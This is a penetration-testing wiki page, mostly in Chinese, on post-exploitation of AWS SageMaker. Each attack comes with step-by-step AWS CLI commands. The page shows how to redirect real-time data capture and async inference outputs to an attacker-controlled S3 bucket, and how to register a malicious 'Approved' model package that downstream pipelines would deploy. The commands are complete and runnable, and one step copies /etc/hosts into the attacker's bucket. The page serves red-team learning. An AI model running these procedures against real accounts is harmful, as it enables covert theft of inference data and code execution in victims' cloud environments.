# AWS - SageMaker Post-Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker endpoint 数据窃取 via UpdateEndpoint DataCaptureConfig

滥用 SageMaker endpoint 管理以启用对完整请求/响应的捕获，将数据发送到攻击者控制的 S3 桶，而无需接触模型或容器。使用零/低停机时间的滚动更新，并且仅需要 endpoint 管理权限。

### Requirements
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: `s3:CreateBucket` (或使用同一账号中的现有桶)
- 可选（如果使用 SSE‑KMS）：在选定的 CMK 上具有 `kms:Encrypt`
- Target: An existing InService real‑time endpoint in the same account/region

### Steps
1) 识别一个 InService endpoint 并收集当前的 production variants
```bash
REGION=${REGION:-us-east-1}
EP=$(aws sagemaker list-endpoints --region $REGION --query "Endpoints[?EndpointStatus=='InService']|[0].EndpointName" --output text)
echo "Endpoint=$EP"
CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
echo "EndpointConfig=$CFG"
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CFG" --query ProductionVariants > /tmp/pv.json
```
2) 为捕获准备 attacker S3 目标位置
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-capture-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
```
3) 创建一个新的 EndpointConfig，保留相同的 variants，但将 DataCapture 启用到 attacker bucket

注意：使用满足 CLI 验证的显式 content types。
```bash
NEWCFG=${CFG}-dc
cat > /tmp/dc.json << JSON
{
"EnableCapture": true,
"InitialSamplingPercentage": 100,
"DestinationS3Uri": "s3://$BUCKET/capture",
"CaptureOptions": [
{"CaptureMode": "Input"},
{"CaptureMode": "Output"}
],
"CaptureContentTypeHeader": {
"JsonContentTypes": ["application/json"],
"CsvContentTypes": ["text/csv"]
}
}
JSON
aws sagemaker create-endpoint-config \
--region $REGION \
--endpoint-config-name "$NEWCFG" \
--production-variants file:///tmp/pv.json \
--data-capture-config file:///tmp/dc.json
```
4) 使用 rolling update 应用新的 config（minimal/no downtime）
```bash
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
5) 生成至少一次推理调用（如果存在实时流量则可选）
```bash
echo '{"inputs":[1,2,3]}' > /tmp/payload.json
aws sagemaker-runtime invoke-endpoint --region $REGION --endpoint-name "$EP" \
--content-type application/json --accept application/json \
--body fileb:///tmp/payload.json /tmp/out.bin || true
```
6) 在 attacker S3 中验证捕获内容
```bash
aws s3 ls s3://$BUCKET/capture/ --recursive --human-readable --summarize
```
### 影响
- Full exfiltration of real‑time inference request and response payloads (and metadata) 从目标 endpoint 到攻击者控制的 S3 存储桶。
- 无需修改模型/容器镜像，仅在 endpoint 级别进行更改，从而实现以最小运营中断进行隐蔽的数据窃取路径。


## SageMaker async inference output hijack via UpdateEndpoint AsyncInferenceConfig

滥用 endpoint 管理，通过克隆当前 EndpointConfig 并设置 AsyncInferenceConfig.OutputConfig 的 S3OutputPath/S3FailurePath，将异步推理输出重定向到攻击者控制的 S3 存储桶。This exfiltrates model predictions (and any transformed inputs included by the container) 而无需修改模型/容器。

### Requirements
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: 能够写入攻击者控制的 S3 存储桶（通过模型执行角色或宽松的存储桶策略）
- Target: 一个在 InService 状态且正在（或将要）使用异步调用的 endpoint

### Steps
1) 从目标 endpoint 收集当前的 ProductionVariants
```bash
REGION=${REGION:-us-east-1}
EP=<target-endpoint-name>
CUR_CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CUR_CFG" --query ProductionVariants > /tmp/pv.json
```
2) 创建一个 attacker bucket（确保模型执行角色对其具有 PutObject 权限）
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-async-exfil-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION || true
```
3) 克隆 EndpointConfig 并 hijack AsyncInference outputs 到 attacker bucket
```bash
NEWCFG=${CUR_CFG}-async-exfil
cat > /tmp/async_cfg.json << JSON
{"OutputConfig": {"S3OutputPath": "s3://$BUCKET/async-out/", "S3FailurePath": "s3://$BUCKET/async-fail/"}}
JSON
aws sagemaker create-endpoint-config --region $REGION   --endpoint-config-name "$NEWCFG"   --production-variants file:///tmp/pv.json   --async-inference-config file:///tmp/async_cfg.json
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
4) 触发 async invocation，并验证对象是否落入攻击者的 S3
```bash
aws s3 cp /etc/hosts s3://$BUCKET/inp.bin
aws sagemaker-runtime invoke-endpoint-async --region $REGION --endpoint-name "$EP" --input-location s3://$BUCKET/inp.bin >/tmp/async.json || true
sleep 30
aws s3 ls s3://$BUCKET/async-out/ --recursive || true
aws s3 ls s3://$BUCKET/async-fail/ --recursive || true
```
### 影响
- 将异步推理结果（以及错误体）重定向到攻击者控制的 S3，允许隐蔽地外传预测结果以及容器产生的可能敏感的前/后处理输入，且无需更改模型代码或镜像，并且停机时间极短或无停机。

## SageMaker Model Registry 通过 CreateModelPackage(Approved) 的供应链注入

如果攻击者能够在目标 SageMaker Model Package Group 上执行 CreateModelPackage，他们可以注册一个指向攻击者控制的容器镜像的新模型版本并立即将其标记为 Approved。许多 CI/CD 流水线会将 Approved 的模型版本自动部署到端点或训练作业，从而导致攻击者在服务的执行角色下执行代码。如果 ModelPackageGroup 的资源策略过于宽松，跨账户暴露风险会被放大。

### 要求
- IAM（对现有组实施篡改的最低权限）：在目标 ModelPackageGroup 上拥有 `sagemaker:CreateModelPackage`
- 可选（如果要创建组）：`sagemaker:CreateModelPackageGroup`
- S3：对引用的 ModelDataUrl 的读取权限（或托管攻击者控制的工件）
- 目标：下游自动化会监控以部署 Approved 版本的 Model Package Group

### 步骤
1) 设置区域并创建/查找目标 Model Package Group
```bash
REGION=${REGION:-us-east-1}
MPG=victim-group-$(date +%s)
aws sagemaker create-model-package-group --region $REGION --model-package-group-name $MPG --model-package-group-description "test group"
```
2) 在 S3 中准备示例模型数据
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-mpkg-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
head -c 1024 </dev/urandom > /tmp/model.tar.gz
aws s3 cp /tmp/model.tar.gz s3://$BUCKET/model/model.tar.gz --region $REGION
```
3) 注册一个恶意（此处为良性）Approved model package version，引用一个公共 AWS DLC 镜像
```bash
IMG="683313688378.dkr.ecr.$REGION.amazonaws.com/sagemaker-scikit-learn:1.2-1-cpu-py3"
cat > /tmp/inf.json << JSON
{
"Containers": [
{
"Image": "$IMG",
"ModelDataUrl": "s3://$BUCKET/model/model.tar.gz"
}
],
"SupportedContentTypes": ["text/csv"],
"SupportedResponseMIMETypes": ["text/csv"]
}
JSON
aws sagemaker create-model-package --region $REGION   --model-package-group-name $MPG   --model-approval-status Approved   --inference-specification file:///tmp/inf.json
```
4) 验证新的已批准版本是否存在
```bash
aws sagemaker list-model-packages --region $REGION --model-package-group-name $MPG --output table
```
### 影响
- 将 Model Registry 污染为一个引用攻击者控制代码的 Approved 版本。自动部署 Approved 模型的 Pipelines 可能会拉取并运行攻击者的镜像，从而在 endpoint/training roles 下导致代码执行。
- 在 ModelPackageGroup resource policy (PutModelPackageGroupPolicy) 宽松的情况下，该滥用可以被 cross-account 触发。

## Feature store poisoning

滥用 `sagemaker:PutRecord` 对启用 OnlineStore 的 Feature Group 进行写入，以覆盖被 online inference 使用的实时特征值。结合 `sagemaker:GetRecord`，攻击者可以读取敏感特征。该攻击不需要访问 models 或 endpoints。

{{#ref}}
feature-store-poisoning.md
{{/ref}}
